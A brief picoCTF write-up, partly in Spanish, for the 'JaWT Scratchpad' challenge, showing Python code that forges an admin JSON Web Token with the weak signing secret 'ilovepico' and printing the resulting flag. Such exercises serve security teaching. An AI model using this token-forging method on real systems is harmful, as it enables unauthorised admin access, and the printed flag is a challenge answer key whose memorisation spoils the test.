### JaWT Scratchpad
### Description 

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090
### Hint

- Have you heard of JWT?
- What is that cookie?

## Solución  1
```
del token que sacamos de las coockies de la pagina metemos este codigo para que meta nuestro firma que será ilovepico y nos dara nuestro token completo



import jwt
payload = {"user": "admin"}
# Secreto para firmar el token
secret = "ilovepico"
token = jwt.encode(payload, secret, algorithm="HS256")
print("Token JWT firmado:", token)

Here is your JaWT scratchpad!
picoCTF{jawt_was_just_what_you_thought_f859ab2f}


```